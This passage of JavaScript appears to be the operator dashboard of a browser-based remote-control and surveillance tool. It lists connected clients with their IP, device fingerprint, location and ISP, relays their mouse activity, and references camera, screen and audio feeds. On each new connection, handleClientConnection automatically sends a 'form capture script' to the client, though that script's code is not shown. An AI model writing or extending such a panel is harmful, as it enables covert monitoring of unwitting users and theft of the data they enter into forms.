                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%23ff0000' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }
                                console.log(`Click event: ${button} for client ${clientId}`);
                                
                                // Reset to default green color after a short delay
                                setTimeout(() => {
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%2300cc00' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }, 300);
                            }
                            // For long clicks, fixed 3 seconds duration
                            else if (data.type === 'mouse-long-click') {
                                // Set cursor fill color based on button type
                                if (button === 'right') {
                                    // Change SVG fill color to blue
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%230000ff' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                } else {
                                    // Change SVG fill color to red
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%23ff0000' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }
                                console.log(`Long click event: ${button} for client ${clientId}`);
                                
                                // Fixed duration of 3 seconds regardless of client click duration
                                setTimeout(() => {
                                    mouseCursor.style.backgroundImage = `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 512'%3E%3Cpath fill='%2300cc00' d='M302.189 329.126H196.105l55.831 135.993c3.889 9.428-1.286 20.125-10.714 24.014l-21.442 8.814c-9.428 3.889-20.125-1.286-24.014-10.714l-55.831-135.993-81.766 89.142c-8.011 8.739-22.188 1.907-22.188-10.733V15c0-12.57 14.027-19.436 22.187-10.732l267.221 290.857c8.08 8.804 2.136 22.365-10.302 24z'%3E%3C/path%3E%3C/svg%3E")`;
                                }, 3000);
                            }
                        }
                    }
                    
                    else if (data.type === 'mouse-position') {
                        // Update the mouse position display in the header
                        const mouseX = document.getElementById('mouseX');
                        const mouseY = document.getElementById('mouseY');
                        if (mouseX && mouseY) {
                            mouseX.textContent = Math.round(data.x);
                            mouseY.textContent = Math.round(data.y);
                        }
                        
                        // Update the detailed position display in preview section
                        const mouseXDetail = document.getElementById('mouseXDetail');
                        const mouseYDetail = document.getElementById('mouseYDetail');
                        const mouseClientId = document.getElementById('mouseClientId');
                        
                        if (mouseXDetail && mouseYDetail && mouseClientId) {
                            // Update with more precise values (include decimal places)
                            mouseXDetail.textContent = data.x.toFixed(2);
                            mouseYDetail.textContent = data.y.toFixed(2);
                            
                            // Show client ID details (truncated if needed)
                            if (data.clientId) {
                                const shortClientId = data.clientId.split('_').pop().substring(0, 8);
                                mouseClientId.textContent = shortClientId;
                                mouseClientId.title = data.clientId; // Show full ID on hover
                            }
                            
                            // Add flash effect to the detail boxes
                            const boxes = document.querySelectorAll('.position-box');
                            boxes.forEach(box => {
                                box.style.boxShadow = '0 0 8px rgba(33, 150, 243, 0.6)';
                                setTimeout(() => {
                                    box.style.boxShadow = '0 2px 5px rgba(0,0,0,0.1)';
                                }, 300);
                            });
                        }
                        
                        // Apply styling based on mouse movement
                        const mouseDisplay = document.getElementById('mousePositionDisplay');
                        if (mouseDisplay) {
                            // Flash effect on update
                            mouseDisplay.style.backgroundColor = '#b3daff';
                            setTimeout(() => {
                                mouseDisplay.style.backgroundColor = '#e6f4ff';
                            }, 200);
                        }
                    
                    }

                } catch (error) {
                    console.error('Error parsing message:', error);
                }
            };
            
            // Update client's last seen time from ping messages
            function updateClientLastSeen(data) {
                // We need to find the client using the full client ID as the primary identifier
                // The client ID now includes the device fingerprint to ensure uniqueness
                const clientKeys = Object.keys(clients);
                let foundClient = false;
                
                // First try to match by exact client ID (most reliable)
                for (const key of clientKeys) {
                    const client = clients[key];
                    if (client.clientId === data.clientId) {
                        // Update last seen time
                        client.lastSeen = new Date().toISOString();
                        client.status = 'online'; // Ensure client is marked as online
                        
                        // Clear any timeout that would mark this client as offline
                        if (connectionTimeouts[key]) {
                            clearTimeout(connectionTimeouts[key]);
                        }
                        
                        // Set a new timeout
                        connectionTimeouts[key] = setTimeout(() => {
                            if (clients[key]) {
                                clients[key].status = 'offline';
                                updateClientUI(key);
                                updateCommunicateButtonState();
                            }
                        }, 15000); // Give more time (15 seconds) before marking as offline
                        
                        // Update UI
                        updateClientUI(key);
                        foundClient = true;
                        break; // Exit the loop as we found an exact match
                    }
                }
                
                // If no match by client ID, try IP as a fallback (less reliable)
                if (!foundClient && data.ip) {
                    for (const key of clientKeys) {
                        const client = clients[key];
                        if (client.ip === data.ip) {
                            // Update last seen time
                            client.lastSeen = new Date().toISOString();
                            client.status = 'online';
                            
                            // Clear any timeout that would mark this client as offline
                            if (connectionTimeouts[key]) {
                                clearTimeout(connectionTimeouts[key]);
                            }
                            
                            // Set a new timeout
                            connectionTimeouts[key] = setTimeout(() => {
                                if (clients[key]) {
                                    clients[key].status = 'offline';
                                    updateClientUI(key);
                                    updateCommunicateButtonState();
                                }
                            }, 15000);
                            
                            // Update UI
                            updateClientUI(key);
                            foundClient = true;
                            
                            // Update the client ID if it was missing
                            if (!client.clientId && data.clientId) {
                                clients[key].clientId = data.clientId;
                                console.log(`Updated client ${key} with ID: ${data.clientId}`);
                            }
                            
                            break;
                        }
                    }
                }
                
                return foundClient;
            }
        }
        
        // Send message to selected client
        function sendMessageToClient(clientKey, message) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                const client = clients[clientKey];
                if (client && client.status === 'online') {
                    const messageData = {
                        type: 'message',
                        targetClientId: client.clientId,
                        targetIp: client.ip,
                        message: message
                    };
                    
                    try {
                        ws.send(JSON.stringify(messageData));
                        return true;
                    } catch (error) {
                        console.error('Error sending message:', error);
                        return false;
                    }
                } else {
                    alert('Cannot send message to offline client');
                    return false;
                }
            } else {
                alert('WebSocket connection is not open');
                return false;
            }
        }
        
        // Send data to selected clients only
        function sendToSelectedClients(data) {
            if (!ws || ws.readyState !== WebSocket.OPEN) {
                alert('WebSocket connection is not open');
                return false;
            }
            
            const selectedClients = Object.keys(clients).filter(key => clients[key].selected && clients[key].status === 'online');
            
            if (selectedClients.length === 0) {
                console.warn('No selected clients available for message:', data.type || 'unknown');
                return false;
            }
            
            selectedClients.forEach(clientKey => {
                const client = clients[clientKey];
                if (!client || !client.clientId) {
                    console.error(`Selected client ${clientKey} is missing a clientId, skipping message send`);
                    return;
                }
                
                const messageData = {
                    ...data,
                    targetClientId: client.clientId,
                    targetIp: client.ip,
                    strictTargeting: true,
                    timestamp: Date.now()
                };
                
                try {
                    ws.send(JSON.stringify(messageData));
                    console.log(`Sent message ${data.type || ''} to client ${client.clientId}`);
                } catch (error) {
                    console.error(`Error sending to client ${client.clientId}:`, error);
                }
            });
            
            return true;
        }
        
        // Global client timeout duration (in milliseconds)
        const CLIENT_TIMEOUT = 7000; // 7 seconds
        
        // Handle client connections
        function handleClientConnection(data) {
            // Only handle strict 'connection' data type
            if (data.type === 'connection') {
                console.log('Processing connection from client:', data.clientId, 'IP:', data.ip);
                
                // Extract the base client ID (before any tab or session specific identifiers)
                // Format is typically: client_timestamp_devicefingerprint_tab_timestamp_random
                let baseClientId = data.clientId;
                if (data.clientId && data.clientId.includes('_tab_')) {
                    baseClientId = data.clientId.split('_tab_')[0];
                    console.log('Extracted base client ID:', baseClientId);
                }
                
                // Use the base client ID as the primary identifier for merging clients
                // This ensures different tabs from the same device are merged
                const clientIdentifier = baseClientId || ('ip_' + data.ip + '_' + Date.now());
                
                // Create a unique client key for display and storage
                let clientKey;
                
                // Check if we already have this base client ID in our records
                const existingClientKeys = Object.keys(clients);
                // First try to find by exact clientId
                let existingClient = existingClientKeys.find(key => clients[key].clientId === data.clientId);
                
                // If not found by exact ID, try to find by base client ID
                if (!existingClient && baseClientId) {
                    existingClient = existingClientKeys.find(key => {
                        // Check if the client's ID starts with our base client ID
                        const clientId = clients[key].clientId;
                        return clientId && clientId.startsWith(baseClientId);
                    });
                }
                
                if (existingClient) {
                    // Use the existing client key if found
                    clientKey = existingClient;
                    console.log(`Client merged with existing client key: ${clientKey}`);
                } else {
                    // Generate a new key for this client
                    clientKey = clientIdentifier;
                    console.log(`Created new client with key: ${clientKey}`);
                }
                
                // Update or create client data
                                if (!clients[clientKey]) {
                    // New client
                    clients[clientKey] = {
                        ip: data.ip,
                        clientId: data.clientId,
                        baseClientId: baseClientId, // Store the base client ID for future merges
                        userAgent: data.userAgent || 'Unknown',
                        location: data.geo || 'Unknown',
                        firstSeen: new Date().toISOString(),
                        lastSeen: new Date().toISOString(),
                        status: 'online',
                        selected: false,
                        details: data.details || {},
                        nickname: '' // Add nickname field
                    };
                    
                    // Create a new UI element for this client immediately (fix the delay)
                    setTimeout(() => {
                        createClientElement(clientKey);
                        
                        // Send form capture script to the new client
                        sendFormCaptureScript(clientKey);
                    }, 0);
                } else {
                    // Existing client
                    clients[clientKey].lastSeen = new Date().toISOString();
                    clients[clientKey].status = 'online';
                    
                    // Update details if available
                    if (data.details) {
                        clients[clientKey].details = data.details;
                    }
                    
                    // Store/update the base client ID for future merges
                    if (baseClientId) {
                        clients[clientKey].baseClientId = baseClientId;
                    }
                    
                    // Update the UI for this client immediately (fix the delay)
                    setTimeout(() => updateClientUI(clientKey), 0);
                }
                
                // Clear any existing timeout for this client
                
                // Save clients to localStorage
                saveClientsToStorage();
            }
        }
        
        // Add client card to UI
        function addClientCard(clientKey) {
            // Check if we already have this client in the UI
            if (document.getElementById(`client-${clientKey}`)) {
                return;
            }
            
            // Hide empty state if this is the first client
            if (Object.keys(clients).length === 1) {
                emptyState.style.display = 'none';
            }
            
            const client = clients[clientKey];
            const card = document.createElement('div');
            card.className = 'client-card';
            card.id = `client-${clientKey}`;
            
            const statusClass = client.status === 'online' ? 'status-online' : 'status-offline';
            
            // Display IP and a shortened client ID as the main identifier with status text
            const statusText = client.status === 'online' ? 'Online' : 'Offline';
            const statusTextClass = client.status === 'online' ? 'online-text' : 'offline-text';
            const selectBtnText = client.selected ? 'Selected' : 'Select';
            const selectBtnClass = client.selected ? 'select-btn selected' : 'select-btn';
            
            // Get client details or default values
            const details = client.details || {};
            
            // Extract a short version of the client ID for display
            const shortClientId = client.clientId ? 
                client.clientId.split('_').pop().substring(0, 8) + '...' : 
                'Unknown';
                
            // Get display name (nickname or IP)
            const displayName = client.nickname || client.ip;
            
            card.innerHTML = `
                <div class="client-ip">
                    ${displayName}
                    <span class="status-text ${statusTextClass}">${statusText}</span>
                </div>
                <div class="client-status ${statusClass}"></div>
                <div class="client-details" id="details-${clientKey}">
                    <div class="nickname-editor">
                        <input type="text" class="nickname-input" placeholder="Enter nickname for this client" value="${client.nickname || ''}" data-key="${clientKey}">
                        <div class="nickname-hint">Set a friendly name to identify this client</div>
                        <button class="save-nickname-btn" data-key="${clientKey}"><i class="fas fa-save"></i> Save</button>
                    </div>
                    <div class="details-grid">
                        <div class="detail-item">
                            <span class="detail-label">Last Seen:</span>
                            <span>${new Date(client.lastSeen).toLocaleTimeString()}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Client ID:</span>
                            <span title="${client.clientId || ''}"><strong>${shortClientId}</strong></span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">IP Address:</span>
                            <span>${client.ip}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Device:</span>
                            <span>${details.isMobile ? 'Mobile' : 'Desktop'} | ${details.os || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Browser:</span>
                            <span>${details.browser || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Screen:</span>
                            <span>${details.screen || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Location:</span>
                            <span>${details.city || 'Unknown'}${details.region ? ', ' + details.region : ''}${details.country ? ' (' + details.country + ')' : ''}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">ISP:</span>
                            <span>${details.isp || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Language:</span>
                            <span>${details.language || 'Unknown'}</span>
                        </div>
                    </div>
                    <div class="client-actions">
                        <button class="${selectBtnClass}" data-key="${clientKey}">
                            <i class="fas fa-${client.selected ? 'check-square' : 'square'}"></i> ${selectBtnText}
                        </button>
                        <button class="btn-remove" data-key="${clientKey}">
                            <i class="fas fa-times"></i> Remove
                        </button>
                    </div>
                </div>
            `;
            
            // Add selected class if client is selected
            if (client.selected) {
                card.classList.add('selected');
            }
            
            clientList.insertBefore(card, emptyState);
            
            // Add click event to toggle details
            card.addEventListener('click', function(e) {
                // Don't toggle if clicking on a button, input field, or nickname editor
                if (e.target.tagName === 'BUTTON' || 
                    e.target.tagName === 'INPUT' || 
                    e.target.closest('button') || 
                    e.target.closest('.nickname-editor')) {
                    return;
                }
                
                // Toggle this client's details independently
                const details = document.getElementById(`details-${clientKey}`);
                details.classList.toggle('show');
            });
            
            // Add click event to remove button
            const removeBtn = card.querySelector('.btn-remove');
            removeBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                removeClient(clientKey);
            });
            
            // Add click event to select button
            const selectBtn = card.querySelector('.select-btn');
            if (selectBtn) {
                selectBtn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    toggleClientSelection(clientKey);
                });
            }
            
            // Add click event to save nickname button
            const saveNicknameBtn = card.querySelector('.save-nickname-btn');
            const nicknameInput = card.querySelector('.nickname-input');
            if (saveNicknameBtn && nicknameInput) {
                saveNicknameBtn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    const newNickname = nicknameInput.value.trim();
                    saveClientNickname(clientKey, newNickname);
                });
                
                // Also save on Enter key
                nicknameInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        const newNickname = nicknameInput.value.trim();
                        saveClientNickname(clientKey, newNickname);
                    }
                });
                
                // REMOVED live update to fix disappearing input issue
                // This event now does nothing while typing to prevent interference with input field
                nicknameInput.addEventListener('input', function(e) {
                    // Do nothing while typing - let the user type freely without interference
                    // The save button or Enter key will handle saving the nickname
                });
            }
        }
        
        // Save client nickname
        function saveClientNickname(clientKey, nickname) {
            if (clients[clientKey]) {
                // Update the client object
                clients[clientKey].nickname = nickname;
                saveClientsToStorage();
                
                // Update the client card display name
                const card = document.getElementById(`client-${clientKey}`);
                if (card) {
                    const clientIpElement = card.querySelector('.client-ip');
                    if (clientIpElement) {
                        // Keep the status text element intact
                        const statusElement = clientIpElement.querySelector('.status-text');
                        const statusHTML = statusElement ? statusElement.outerHTML : '';
                        
                        // Update the display name but keep the status
                        const displayName = nickname || clients[clientKey].ip;
                        clientIpElement.innerHTML = displayName + statusHTML;
                    }
                    
                    // Add a visual feedback to the save button
                    const saveBtn = card.querySelector('.save-nickname-btn');
                    if (saveBtn) {
                        const originalText = saveBtn.innerHTML;
                        saveBtn.innerHTML = '<i class="fas fa-check"></i> Saved';
                        saveBtn.style.background = '#4CAF50';
                        
                        // Reset button after 1.5 seconds
                        setTimeout(() => {
                            saveBtn.innerHTML = originalText;
                            saveBtn.style.background = '';
                        }, 1500);
                    }
                }
                
                // Update client badge in preview section
                if (clients[clientKey].clientId) {
                    updateClientBadge(clients[clientKey].clientId, nickname);
                    
                    // Also try to update all badges directly
                    updateAllClientBadgesWithNickname(clients[clientKey].clientId, nickname);
                    
                    // Use the direct DOM approach to force the nickname to stay
                    forceNicknameInPreview(clients[clientKey].clientId, nickname);
                    
                    // Update all client display names in camera and screen sections
                    updateClientDisplayNames();
                }
                
                // Show a success message
                if (nickname) {
                    showStatusMessage('success', `Nickname "${nickname}" saved for client ${clients[clientKey].ip}`);
                } else {
                    showStatusMessage('info', `Nickname removed for client ${clients[clientKey].ip}`);
                }
            }
        }
        
        // Force the nickname to stay in the preview section using direct DOM manipulation
        function forceNicknameInPreview(clientId, nickname) {
            if (!clientId || !nickname) return;
            
            console.log(`Forcing nickname "${nickname}" for client ${clientId} in preview section`);
            
            // Immediately try to replace all matching badges
            replaceClientBadges(clientId, nickname);
            
            // Set up a recurring interval to keep checking and updating
            const forceInterval = setInterval(() => {
                replaceClientBadges(clientId, nickname);
            }, 100); // Check every 100ms for maximum responsiveness
            
            // Store the interval ID so we can clear it if needed
            window.forceIntervals = window.forceIntervals || [];
            window.forceIntervals.push(forceInterval);
            
            // Run forever - we want the nickname to persist as long as the page is open
            // No timeout to stop the interval
        }
        
        // Replace client badges with custom elements that can't be modified
        function replaceClientBadges(clientId, nickname) {
            if (!clientId || !nickname) return;
            console.log(`Attempting to replace badges for client ${clientId} with nickname "${nickname}"`);
            
            let replaced = false;
            
            // PART 1: Handle preview section badges (original functionality)
            const allBadges = document.querySelectorAll('.client-badge, .custom-client-badge');
            allBadges.forEach(badge => {
                const badgeId = badge.id && badge.id.replace(/^(client-badge-|custom-badge-)/, '');
                if (badgeId) {
                    const shortClientId = clientId.split('_').pop().substring(0, 8);
                    const shortBadgeId = badgeId.split('_').pop().substring(0, 8);
                    
                    // Check if this badge is related to our client
                    if (badgeId.includes(shortClientId) || clientId.includes(shortBadgeId) || 
                        badgeId === clientId || shortBadgeId === shortClientId) {
                        
                        // If it's already a custom badge, just update the text
                        if (badge.classList.contains('custom-client-badge')) {
                            if (badge.textContent !== `Client: ${nickname}`) {
                                console.log(`Updating existing custom badge ${badge.id} to "${nickname}"`);
                                badge.textContent = `Client: ${nickname}`;
                                replaced = true;
                            }
                        }
                        // Otherwise replace it with a new custom badge
                        else if (badge.classList.contains('client-badge')) {
                            console.log(`Replacing badge ${badge.id} with custom element for nickname "${nickname}"`);
                            
                            // Create a completely new element with the same styling
                            const customBadge = document.createElement('div');
                            customBadge.id = `custom-badge-${badgeId}`;
                            customBadge.className = 'custom-client-badge';
                            customBadge.style.backgroundColor = '#2196F3';
                            customBadge.style.color = 'white';
                            customBadge.style.padding = '3px 8px';
                            customBadge.style.borderRadius = '12px';
                            customBadge.style.fontSize = '12px';
                            customBadge.style.display = 'inline-block';
                            customBadge.textContent = `Client: ${nickname}`;
                            customBadge.dataset.clientId = clientId;
                            customBadge.dataset.replaced = 'true';
                            
                            // Replace the original badge with our custom one
                            badge.parentNode.replaceChild(customBadge, badge);
                            replaced = true;
                            
                            // Add a special style to ensure our custom badge is always visible
                            const style = document.createElement('style');
                            style.textContent = `
                                .custom-client-badge {
                                    display: inline-block !important;
                                    visibility: visible !important;
                                    opacity: 1 !important;
                                    z-index: 9999 !important;
                                }
                            `;
                            document.head.appendChild(style);
                        }
                    }
                }
            });
            
            // PART 2: Handle permission section feed badges
            const permBadges = document.querySelectorAll('.client-feed-id');
            permBadges.forEach(badge => {
                // Try to get client ID from container or badge text
                let feedClientId = null;
                
                // First check container data attribute
                const container = badge.closest('[data-client-id]');
                if (container) {
                    feedClientId = container.getAttribute('data-client-id');
                }
                
                // If no container ID, try to extract from badge text
                if (!feedClientId) {
                    const text = badge.textContent || '';
                    const matches = text.match(/Client:?\s+([a-zA-Z0-9_-]+)/);
                    if (matches && matches[1]) {
                        feedClientId = matches[1];
                    }
                }
                
                // Now check if this badge is for our client
                if (feedClientId) {
                    const shortFeedId = feedClientId.split('_').pop().substring(0, 8);
                    const shortId = clientId.split('_').pop().substring(0, 8);
                    
                    if (feedClientId === clientId || 
                        shortFeedId === shortId || 
                        feedClientId.includes(shortId) || 
                        clientId.includes(shortFeedId)) {
                        
                        console.log(`Found permission badge for client ${clientId}`);
                        badge.textContent = `Client: ${nickname}`;
                        badge.title = `Full Client ID: ${clientId}`;
                        replaced = true;
                    }
                    
                    // Special handling for client_1, client_2 pattern
                    if (feedClientId.match(/^client_\d+$/) && clientId !== feedClientId) {
                        console.log(`Found placeholder client ID pattern: ${feedClientId}`);
                        badge.textContent = `Client: ${nickname}`;
                        badge.title = `Placeholder ID: ${feedClientId}, Using nickname from: ${clientId}`;
                        replaced = true;
                    }
                }
            });
            
            // PART 3: Handle log entries
            const logEntries = document.querySelectorAll('.status .client-id, .status[data-client-id] .client-id');
            logEntries.forEach(span => {
                // Try to get client ID from container or span text
                let entryClientId = null;
                
                // First check container data attribute
                const container = span.closest('[data-client-id]');
                if (container) {
                    entryClientId = container.getAttribute('data-client-id');
                } else {
                    // Otherwise use the span text
                    entryClientId = span.textContent.trim();
                }
                
                // Now check if this entry is for our client
                if (entryClientId) {
                    const shortEntryId = entryClientId.split('_').pop().substring(0, 8);
                    const shortId = clientId.split('_').pop().substring(0, 8);
                    
                    if (entryClientId === clientId || 
                        shortEntryId === shortId || 
                        entryClientId.includes(shortId) || 
                        clientId.includes(shortEntryId)) {
                        
                        console.log(`Found log entry for client ${clientId}`);
                        span.textContent = nickname;
                        span.title = `Full Client ID: ${clientId}`;
                        replaced = true;
                    }
                    
                    // Special handling for client_1, client_2 pattern
                    if (entryClientId.match(/^client_\d+$/) && clientId !== entryClientId) {
                        console.log(`Found placeholder log entry: ${entryClientId}`);
                        span.textContent = nickname;
                        span.title = `Placeholder ID: ${entryClientId}, Using nickname from: ${clientId}`;
                        replaced = true;
                    }
                }
            });
            
            // PART 4: Handle container headers
            const headers = document.querySelectorAll('h4, .client-header, strong, [id^="client-camera-"] h4, [id^="client-screen-"] h4, [id^="client-audio-"] h4, [id^="client-screen-container-"] h4, [id^="camera-container-"] h4, [id^="screen-container-"] h4, [id^="audio-container-"] h4');
            headers.forEach(header => {
                const text = header.textContent || '';
                if (text.includes('Client:') || text.includes('Client ')) {
                    // Try to find parent container with ID
                    const container = header.closest('[id]');
                    if (container && container.id) {
                        const containerId = container.id.split('-').pop(); // Get last part as id
                        if (containerId) {
                            const shortContainerId = containerId.split('_').pop().substring(0, 8);
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            
                            if (containerId === clientId || 
                                shortContainerId === shortId || 
                                containerId.includes(shortId) || 
                                clientId.includes(shortContainerId)) {
                                
                                console.log(`Found container header for client ${clientId}`);
                                
                                // Handle different header formats
                                if (text.includes('Client:')) {
                                    header.textContent = `Client: ${nickname}`;
                                } else if (text.includes('Client ')) {
                                    // For 'Client ID - Time' format
                                    header.textContent = header.textContent.replace(/Client [^ ]+/, `Client ${nickname}`);
                                }
                                
                                header.title = `Full Client ID: ${clientId}`;
                                replaced = true;
                            }
                            
                            // Special handling for client_1, client_2 pattern
                            if (containerId.match(/^client_\d+$/) && clientId !== containerId) {
                                console.log(`Found placeholder container: ${containerId}`);
                                if (text.includes('Client:')) {
                                    header.textContent = `Client: ${nickname}`;
                                } else if (text.includes('Client ')) {
                                    header.textContent = header.textContent.replace(/Client [^ ]+/, `Client ${nickname}`);
                                }
                                header.title = `Placeholder ID: ${containerId}, Using nickname from: ${clientId}`;
                                replaced = true;
                            }
                        }
                    }
                }
            });
            
            if (replaced) {
                console.log(`Updated badges for client ${clientId} with nickname "${nickname}"`);
            }
        }
        
        // Helper function to get client's display name (nickname or ID)
        function getClientDisplayName(clientId) {
            if (!clientId) return 'Unknown';
            
            // Default to shortened client ID
            let displayName = clientId.substring(0, 8);
            
            // Find client by clientId in our clients object
            for (const key in clients) {
                if (clients[key].clientId === clientId && clients[key].nickname) {
                    displayName = clients[key].nickname;
                    break;
                }
            }
            
            // If no exact match, try partial match with the shortened ID
            if (displayName === clientId.substring(0, 8)) {
                const shortId = clientId.split('_').pop().substring(0, 8);
                for (const key in clients) {
                    if (clients[key].clientId && 
                        clients[key].clientId.includes(shortId) && 
                        clients[key].nickname) {
                        displayName = clients[key].nickname;
                        break;
                    }
                }
            }
            
            return displayName;
        }

        // Update all client badges with a specific nickname
        function updateAllClientBadgesWithNickname(clientId, nickname) {
            if (!clientId || !nickname) return;
            
            console.log(`Trying to update all badges for client ${clientId} with nickname ${nickname}`);
            
            // Use our more aggressive replacement approach
            replaceClientBadges(clientId, nickname);
            
            // Set up a recurring check to keep updating badges
            const persistInterval = setInterval(() => {
                console.log(`Running persistent update for client ${clientId}`);
                replaceClientBadges(clientId, nickname);
            }, 50); // Check more frequently (50ms) to catch new containers quickly
            
            // Store the interval ID
            window.persistIntervals = window.persistIntervals || [];
            window.persistIntervals.push(persistInterval);
            
            // Run forever - we want the nickname to persist as long as the page is open
            // No timeout to stop the interval
        }
        
        // Update client badge in preview section
        function updateClientBadge(clientId, nickname) {
            if (!clientId) return;
            
            console.log(`Updating client badge for ${clientId} with nickname: ${nickname}`);
            
            // Use our more aggressive replacement approach that completely replaces the badge
            if (nickname) {
                replaceClientBadges(clientId, nickname);
                
                // Set up a short interval to keep checking for new badges
                const checkInterval = setInterval(() => {
                    replaceClientBadges(clientId, nickname);
                }, 100);
                
                // Run for 5 seconds to catch any new badges that might appear
                setTimeout(() => {
                    clearInterval(checkInterval);
                }, 5000);
            } else {
                console.log(`No nickname provided for client ${clientId}, skipping badge update`);
            }
        }
        
        // Update client UI
        function updateClientUI(clientKey) {
            const client = clients[clientKey];
            const card = document.getElementById(`client-${clientKey}`);
            
            if (card && client) {
                // Update status indicator
                const statusElement = card.querySelector('.client-status');
                statusElement.className = `client-status ${client.status === 'online' ? 'status-online' : 'status-offline'}`;
                
                // Update status text
                const statusText = client.status === 'online' ? 'Online' : 'Offline';
                const statusTextClass = client.status === 'online' ? 'online-text' : 'offline-text';
                const statusTextElement = card.querySelector('.status-text');
                if (statusTextElement) {
                    statusTextElement.textContent = statusText;
                    statusTextElement.className = `status-text ${statusTextClass}`;
                }
                
                // Update display name (nickname or IP)
                const clientIpElement = card.querySelector('.client-ip');
                if (clientIpElement) {
                    // Keep the status text element intact
                    const statusElement = clientIpElement.querySelector('.status-text');
                    const statusHTML = statusElement ? statusElement.outerHTML : '';
                    
                    // Update the display name but keep the status
                    const displayName = client.nickname || client.ip;
                    clientIpElement.innerHTML = displayName + statusHTML;
                }
                
                // Update last seen time
                const details = card.querySelector(`#details-${clientKey}`);
                const lastSeenEl = details.querySelector('.detail-item span:last-child');
                lastSeenEl.textContent = new Date(client.lastSeen).toLocaleTimeString();
                
                // Update client-specific stream visibility based on selection state
                updateClientFeedsVisibility(client);
            }
        }
        
       
          
        
        
        // Toggle client selection state
        function toggleClientSelection(clientKey) {
            console.log('Toggling selection for client:', clientKey);
            
            // Get client and card
            const client = clients[clientKey];
            const card = document.getElementById(`client-${clientKey}`);
            
            if (!client || !card) {
                console.error('Client or card not found:', clientKey);
                return;
            }
            
            // Toggle selection state
            client.selected = !client.selected;
            console.log(`Client ${clientKey} selected:`, client.selected);
            
            // Update card classes
            if (client.selected) {
                card.classList.add('selected');
            } else {
                card.classList.remove('selected');
            }
            
            // Update select button
            const selectBtn = card.querySelector('.select-btn');
            if (selectBtn) {
                const selectBtnIcon = selectBtn.querySelector('i');
                
                // Update button class
                if (client.selected) {
                    selectBtn.classList.add('selected');
                } else {
                    selectBtn.classList.remove('selected');
                }
                
                // Update button text and icon
                selectBtn.innerHTML = `<i class="fas fa-${client.selected ? 'check-square' : 'square'}"></i> ${client.selected ? 'Selected' : 'Select'}`;
            }
            
            // Save to localStorage
            saveClientsToStorage();
            
            // Update communicate button state
            updateCommunicateButtonState();
            
            // Update all status logs visibility
            updateStatusLogsVisibility();
            
            // Notify EdenQR module that selection changed
            if (typeof notifyEdenQRSelectionUpdate === 'function') {
                notifyEdenQRSelectionUpdate();
            }
        }
        
        // Update all status logs visibility based on client selection
        function updateStatusLogsVisibility() {
            console.log('Updating status logs visibility');
            
            // Get the IDs of all selected clients
            const selectedClientIds = Object.values(clients)
                .filter(client => client.selected && client.status === 'online')
                .map(client => client.clientId);
            
            console.log(`Selected client IDs for logs: ${JSON.stringify(selectedClientIds)}`);
        }
            

        // Remove client
        function removeClient(clientKey) {
            // Remove from DOM
            const card = document.getElementById(`client-${clientKey}`);
            if (card) {
                card.remove();
            }
            
            // Remove from clients object
            delete clients[clientKey];
            
            // Clear any timeout
                if (connectionTimeouts[clientKey]) {
                    clearTimeout(connectionTimeouts[clientKey]);
                delete connectionTimeouts[clientKey];
            }
            
            // Save to localStorage
            saveClientsToStorage();
            
            // Show empty state if no clients left
            if (Object.keys(clients).length === 0) {
                emptyState.style.display = 'block';
            }
            
            // Update communicate button state
            updateCommunicateButtonState();
        }
        
        // Clear all clients
        function clearAllClients() {
            // Confirm before clearing
